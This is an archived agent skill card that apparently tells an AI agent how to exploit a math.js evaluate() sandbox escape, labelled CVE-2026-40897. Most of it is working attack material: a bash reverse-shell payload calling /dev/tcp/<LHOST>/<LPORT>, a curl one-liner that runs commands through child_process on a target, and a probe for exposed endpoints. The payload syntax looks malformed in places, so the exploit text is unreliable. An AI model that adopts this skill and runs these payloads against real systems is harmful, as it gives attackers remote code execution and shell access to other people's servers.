<!-- archived from /root/.hermes/skills/security/mathjs-sandbox-escape-rce/SKILL.md on 2026-10-21 -->

---
name: mathjs-sandbox-escape-rce
description: "Use when math.js evaluate endpoint. Sandbox RCE."
---

> 归档卡：原目录 `/root/.hermes/skills/security/mathjs-sandbox-escape-rce`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/mathjs-sandbox-escape-rce/…')`，不要相对 `references/legacy/` 解析。

# CVE-2026-40897 Math.js Sandbox Escape → RCE

## Overview
Math.js < 14.3.1. The `evaluate()` function's sandbox can be escaped via `toJSON()` leaking internal `ArrayNode`, then overwriting `.map` to reach `Function.constructor` for arbitrary code execution.

## Detection
```bash
# Test if math.js evaluate is exposed
curl -s <TARGET>/api/evaluate -d '{"expression":"1+1"}' -H 'Content-Type: application/json'
# Returns {"result":2} = math.js endpoint
```

## Exploitation

### Payload (reverse shell)
```
(a]=[[]]["entries"]();a["toJSON"]=a["next"];JSON.stringify(a)["constructor"]["constructor"]("require('child_process').exec('bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"')")()
```

### Step-by-step breakdown
1. `[[]]["entries"]()` — get an ArrayIterator (internal object)
2. `.toJSON = .next` — make JSON.stringify call .next(), returning `{value: ArrayNode, done: false}`
3. `JSON.stringify(a)` — triggers toJSON, leaks internal ArrayNode reference
4. `["constructor"]["constructor"]` — reaches `Function` constructor
5. Execute arbitrary JS with `require('child_process')`

### curl one-liner
```bash
curl -X POST <TARGET>/api/evaluate \
  -H 'Content-Type: application/json' \
  -d '{"expression":"(a]=[[]][\\"entries\\"]();a[\\"toJSON\\"]=a[\\"next\\"];JSON.stringify(a)[\\"constructor\\"][\\"constructor\\"](\\"require(\\\\\\"child_process\\\\\\").execSync(\\\\\\"id\\\\\\")\\\\\\".toString()\\")()"}'
```

## Pitfalls
- Payload is expression-language, not raw JS — syntax is picky
- Only works if `evaluate()` is exposed (common in calculator/formula APIs)
- Patched in 14.3.1 by restricting `toJSON` override on internal objects
- Source: EQSTLab/CVE-2026-40897
